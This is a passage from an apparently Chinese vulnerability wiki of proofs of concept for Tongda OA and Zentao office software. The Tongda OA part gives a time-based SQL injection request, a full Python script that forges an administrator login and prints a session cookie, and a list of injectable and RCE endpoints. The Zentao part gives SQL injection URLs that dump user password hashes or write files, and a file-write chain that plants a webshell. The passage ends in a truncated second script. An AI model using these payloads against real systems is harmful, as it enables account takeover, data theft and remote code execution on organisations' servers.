及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞 漏洞影响 [!NOTE] 通达OA 环境搭建 https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe 双击安装 漏洞复现 漏洞文件位 webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"操作成功\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } 其中 updateAll() 函数并没有使用防止 SQL注入的 sql_injection() 来防止注入 webroot/inc/conn.php 所以这里就出现了 id 参数存在注入的情况，请求包如下 POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) 注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应 例如这里使用官网的测试账户 uid 遍历出为 15 如果uid错误则不会出现时间延迟，将请求包放入 Sqlmap跑一下 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.x-v11.5任意用户登录.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.x-v11.5任意用户登录.html","title":"通达OA v11.x-v11.5任意用户登录","keywords":"","body":"通达OA v11.x-v11.5任意用户登录 漏洞描述 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。 影响版本 [!NOTE] 通达OA 2017版 通达OA版本 V11.X 环境搭建 漏洞环境下载 https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 双击安装即可 漏洞复现 使用POC获取管理员的Cookie root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ 成功获得Cookie,添加Cookie访问 http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0即可 漏洞利用POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11、-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA部分漏洞信息整合.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA部分漏洞信息整合.html","title":"通达OA部分漏洞信息整合","keywords":"","body":"通达OA部分漏洞信息整合 通达OA信息收集 http[s]://TongDaOA.domain/inc/expired.php 判断通达版本 http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET 参数username、email 可爆用户、邮箱 http[s]://TongDaOA.domain/resque/worker.php 计算机名 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除 参考文章 通达OA漏洞一些漏洞点(Github) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Zentao-禅道/zentao.html":{"url":"[+] 协同办公OA系统/Zentao-禅道/zentao.html","title":"Zentao(禅道)","keywords":"","body":"应用简介 禅道 ，项目管理软件 [CNVD-C-2020-121325]-文件上传 漏洞概述 #影响范围 Zentao 由于开发者对link参数过滤不严，导致攻击者对下载链接可控，导致可远程下载服务器恶意脚本文件，造成任意代码执行，获取webshell 漏洞利用 POC http://127.0.0.1/zentao/client-download-1--1.html http://127.0.0.1/zentao/data/client/1/ #这里需要自己开启一个VPS提供下载服务，然后把链接的base64位编码和自己的路径替换一下。 http://127.0.0.1/zentaopms/www/client-download-1--1.html 上传位置zentaopms\\www\\data\\client\\1 免登录SQL注入 #影响版本 Zentao 9.1.2 漏洞利用 http://zentao.me/block-main.html?mode=getblockdata&blockid=case¶m=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtzZWxlY3QgMTIzIGludG8gb3V0ZmlsZSAnZDoveHh4LnR4dCctLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ 解码之后如下，因为可以PDO可以多语句，那么就可以update或者写文件操作 {\"orderBy\":\"order limit 1;select 123 into outfile 'd:/xxx.txt'-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"} 前台Getshell #影响版本 8.2 - 9.2.1 漏洞利用 EXP：https://github.com/jas502n/zentao-getshell python exp.py http://127.0.0.1:81/ jas502n.php` 另一个项目管理软件Jira 🔸 Jira服务工作台路径遍历导致的敏感信息泄露漏洞（CVE-2019-14994） 🔸 Jira未授权SSRF漏洞(CVE-2019-8451) 🔸 Atlassian JIRA服务器模板注入漏洞（CVE-2019-11581） 🔸 CVE-2019-8449 JIRA 信息泄漏漏洞 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 SQL注入漏洞.html":{"url":"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 SQL注入漏洞.html","title":"禅道 11.6版本 SQL注入漏洞","keywords":"","body":"禅道 11.6版本 SQL注入漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 先对禅道的调用流程进行分析,先查看目录为www/index.php首页文件中 这里使用router::createApp创建了一个APP对象 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); 来到framework/base/router.class.php文件查看到createApp方法 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } 这里New了一个对象，查看一下调用方法(348行) 在358行处调用了setConfigRoot方法 $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } 在363行处调用了loadMainConfig方法 $this->loadMainConfig(); public function loadMainConfig() { /* 初始化$config对象。Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* 加载主配置文件。 Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } 这里包含了配置文件config.php配置文件，文件目录为/config/config.php 在25行定义了调用方法 $config->requestType = 'PATH_INFO'; // 请求类型：PATH_INFO|PATHINFO2|GET。 The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFO和PATH_INFO2模式的分隔符。 The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // 请求类型为GET：模块变量名。 requestType=GET: the module var name. $config->methodVar = 'f'; // 请求类型为GET：模块变量名。 requestType=GET: the method var name. $config->viewVar = 't'; // 请求类型为GET：视图变量名。 requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // 请求类型为GET：session变量名。 requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // 支持的视图类型。 Supported view formats. 可以发现这里存在两种路由PATH_INFO|PATH_INFO2：一种是m、f、t来进行调用。另外一种是通过-来进行调用 在index.php中的66行 $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } 看到这一条则是判断力两种调用方法 $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' 跟进setRouteByPathInfo方法 public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * 根据$requestFix分割符，分割网址。 * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * 如果网址中没有分隔符，使用默认的方法。 * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // 使用默认模块 use the default module. $this->setMethodName($this->config->default->method); // 使用默认方法 use the default method. } $this->setControlFile(); } 所以可以推断出调用的方法 例如登录页面有两种访问方法 http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html 再看一下checkPriv方法 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里检测了调用模块和方法的权限，可以知道除了isOpenMethod中定义的公开模块和方法之外，其他的方法都是需要登录的 最后是$app->loadModule();这段代码 public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * 引入该模块的control文件。 * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * 设置control的类名。 * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * 创建control类的实例。 * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * 使用反射机制获取函数参数的默认值。 * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * 根据PATH_INFO或者GET方式设置请求的参数。 * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* 调用该方法 Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } 通过之前获取的moduleName包含对应的control类文件并实例化，随后调用setParamsByPathInfo方法从路径中获取方法对应的参数值，最后通过call_user_func_array方法调用对应control类中的对应方法并赋值。 我们查看module/api/control.php文件中的getModel方法 这里通过call_user_func_array函数调用所有的model文件的所有方法。 $result = call_user_func_array(array(&$module, $methodName), $params); 可以看到module/api/moudel.php中的sql函数 public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } 这里并没有进行过滤，只使用了代码$sql=trim($sql)过滤了空格 我们看一下这里的调用这个方法需要的权限 这里可以看到任何用户都可以调用这个模块的方法，所以我们用它调用sql方法进行查询(空格转换为+,绕过过滤) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user 成功执行sql语句 漏洞利用POC 登陆后访问 http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 任意文件写入漏洞.html":{"url":"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 任意文件写入漏洞.html","title":"禅道 11.6版本 任意文件写入漏洞","keywords":"","body":"禅道 11.6版本 任意文件读取漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 查看module/api/ediyor/moudel.php下的save方法 public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePath参数和$fileContent参数 我们是可控的 调用方法往 /tmp写入一个phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= 在利用 禅道 11.6版本 任意文件读取漏洞 第二种方法来文件包含 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 也可以写入网站目录中 先获取地址 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST：fileContent=');?> 访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 得到目录为 /app/zentaopma/www 请求改为 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> 再去访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1则会再网站目录下生成 xxx.php 文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + 